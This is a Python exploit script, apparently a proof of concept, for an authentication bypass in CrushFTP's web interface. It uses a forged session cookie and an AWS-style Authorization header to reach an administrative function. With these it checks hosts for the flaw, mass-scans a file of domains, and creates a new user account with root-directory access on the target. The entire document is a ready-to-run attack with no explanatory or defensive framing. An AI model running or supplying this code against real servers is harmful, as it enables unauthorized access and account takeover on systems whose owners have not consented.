from colorama import Fore, Style
import requests
import argparse
import urllib3
import concurrent.futures

parser = argparse.ArgumentParser()
parser.add_argument("--target", help="Target host")
parser.add_argument("--target_user", help="Target user", default="crushadmin")
parser.add_argument("--new_user", help="New user")
parser.add_argument("--password", help="Password")
parser.add_argument("--port", help="Port", default=443, type=int)
parser.add_argument("--check", help="Check for vulnerability", action="store_true")
parser.add_argument("--exploit", help="Exploit the vulnerability", action="store_true")
parser.add_argument("--file", help="file to scan", default="domains.txt")
parser.add_argument("--threads", help="Number of concurrent threads", type=int, default=10)
args = parser.parse_args()

requests.packages.urllib3.disable_warnings()

banner = f"""
{Fore.CYAN}

  █████▒▄▄▄█████▓ ██▓███   █     █░███▄    █ ▓█████ ▓█████▄ 
▓██   ▒ ▓  ██▒ ▓▒▓██░  ██▒▓█░ █ ░█░██ ▀█   █ ▓█   ▀ ▒██▀ ██▌
▒████ ░ ▒ ▓██░ ▒░▓██░ ██▓▒▒█░ █ ░█▓██  ▀█ ██▒▒███   ░██   █▌
░▓█▒  ░ ░ ▓██▓ ░ ▒██▄█▓▒ ▒░█░ █ ░█▓██▒  ▐▌██▒▒▓█  ▄ ░▓█▄   ▌
░▒█░      ▒██▒ ░ ▒██▒ ░  ░░░██▒██▓▒██░   ▓██░░▒████▒░▒████▓ 
 ▒ ░      ▒ ░░   ▒▓▒░ ░  ░░ ▓░▒ ▒ ░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒▒▓  ▒ 
 ░          ░    ░▒ ░       ▒ ░ ░ ░ ░░   ░ ▒░ ░ ░  ░ ░ ▒  ▒ 
 ░ ░      ░      ░░         ░   ░    ░   ░ ░    ░    ░ ░  ░ 
                              ░            ░    ░  ░   ░    
                                                     ░    by c0d3Ninja


{Style.RESET_ALL}
"""

def check_vulnerability(target_host, port):
    try:
        headers = {
            "Cookie": "currentAuth=31If; CrushAuth=1744110584619_p38s3LvsGAfk4GvVu0vWtsEQEv31If",
            "Authorization": "AWS4-HMAC-SHA256 Credential=crushadmin/",
            "Connection": "close",
        }
        if port == 443:
            url = f"https://{target_host}/WebInterface/function/"
            response = requests.get(url, headers=headers, verify=False, timeout=10)
            if response.status_code == 200:
                print(f"{Fore.GREEN}[+] {Fore.CYAN}{target_host}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] {Fore.CYAN}{target_host}{Style.RESET_ALL}")
        else:
            url = f"http://{target_host}:{port}/WebInterface/function/"
            response = requests.get(url, headers=headers, verify=False, timeout=10)
            if response.status_code == 200:
                print(f"{Fore.GREEN}[+] {Fore.CYAN}{target_host}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] {Fore.CYAN}{target_host}{Style.RESET_ALL}")
    except requests.exceptions.ConnectionError:
        pass
    except requests.exceptions.Timeout:
        pass
    except requests.exceptions.RequestException:
        pass
    except urllib3.exceptions.ProtocolError:
        pass
    except Exception as e:
        print(f"[-] Error checking vulnerability: {e}")
    

def exploit(target_host, port, target_user, new_user, password):

    headers = {
        "Cookie": "currentAuth=31If; CrushAuth=1744110584619_p38s3LvsGAfk4GvVu0vWtsEQEv31If",
        "Authorization": "AWS4-HMAC-SHA256 Credential=crushadmin/",
        "Connection": "close",
    }

    payload = {
        "command": "setUserItem",
        "data_action": "replace",
        "serverGroup": "MainUsers",
        "username": args.new_user,
        "user": f'<?xml version="1.0" encoding="UTF-8"?><user type="properties"><user_name>{args.new_user}</user_name><password>{args.password}</password><extra_vfs type="vector"></extra_vfs><version>1.0</version><root_dir>/</root_dir><userVersion>6</userVersion><max_logins>0</max_logins><site>(SITE_PASS)(SITE_DOT)(SITE_EMAILPASSWORD)(CONNECT)</site><created_by_username>{args.target_user}</created_by_username><created_by_email></created_by_email><created_time>1744120753370</created_time><password_history></password_history></user>',
        "xmlItem": "user",
        "vfs_items": '<?xml version="1.0" encoding="UTF-8"?><vfs type="vector"></vfs>',
        "permissions": '<?xml version="1.0" encoding="UTF-8"?><VFS type="properties"><item name="/">(read)(view)(resume)</item></VFS>',
        "c2f": "31If"
    }
    try:
        if port == 443:
            response = requests.post(f"https://{target_host}/WebInterface/function/", headers=headers, data=payload, verify=False, timeout=10)
            if response.status_code != 200:
                print(f"[-] Failed to create user: {response.status_code}")
                return
            print(f"[+] User created successfully: {args.new_user}")
        else:
            response = requests.post(f"http://{target_host}:{port}/WebInterface/function/", headers=headers, data=payload, verify=False, timeout=10)
            if response.status_code != 200:
                print(f"[-] Failed to create user: {response.status_code}")
                return
            print(f"[+] User created successfully: {args.new_user}")
    except Exception as e:
        print(f"[-] Error exploiting vulnerability: {e}")

if __name__ == "__main__":
    print(f"{banner}\n")
    if args.check:
        check_vulnerability(args.target, args.port)
    elif args.exploit:
        exploit(args.target, args.port, args.target_user, args.new_user, args.password)
    elif args.file:
        try:
            with open(args.file, "r") as f:
                target_hosts = [line.strip() for line in f if line.strip()]
            
            if not target_hosts:
                print(f"{Fore.YELLOW}Warning: Input file '{args.file}' is empty or contains only whitespace.{Style.RESET_ALL}")
            else:
                print(f"Scanning {Fore.CYAN}{len(target_hosts)}{Style.RESET_ALL} hosts from {Fore.CYAN}{args.file}{Style.RESET_ALL} with {Fore.CYAN}{args.threads}{Style.RESET_ALL} threads...{Style.RESET_ALL}\n")
                # Use ThreadPoolExecutor for concurrency
                with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
                    # Create a lambda or helper function to pass args.port easily
                    check_func = lambda host: check_vulnerability(host, args.port)
                    # Use map to apply the function to all hosts
                    list(executor.map(check_func, target_hosts)) # list() consumes the iterator to ensure all tasks run
                print(f"{Fore.CYAN}Scan complete.{Style.RESET_ALL}")

        except FileNotFoundError:
            print(f"{Fore.RED}Error: Input file '{args.file}' not found.{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}An error occurred during file processing: {e}{Style.RESET_ALL}")
            
    else:
        print(f"{Fore.YELLOW}Please specify an action: --check or --exploit, or provide a file with --file.{Style.RESET_ALL}")
        parser.print_help()
